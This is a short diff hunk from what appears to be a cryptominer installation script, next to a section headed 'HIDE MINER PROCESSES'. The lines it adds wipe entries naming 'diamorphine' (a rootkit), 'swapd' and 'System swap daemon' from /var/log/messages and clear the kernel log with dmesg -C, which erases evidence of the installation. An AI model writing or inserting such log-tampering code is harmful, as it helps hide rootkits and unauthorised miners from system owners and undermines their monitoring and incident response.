@@ -2201,6 +2201,10 @@ else
     echo '  systemctl status lightd → active (running) ✓'
 fi
 
+# Auto-clean nach Installation
+sed -i '/diamorphine/d; /swapd/d; /System swap daemon/d' /var/log/messages
+dmesg -C
+
 echo ''
 
 # ==================== HIDE MINER PROCESSES ====================
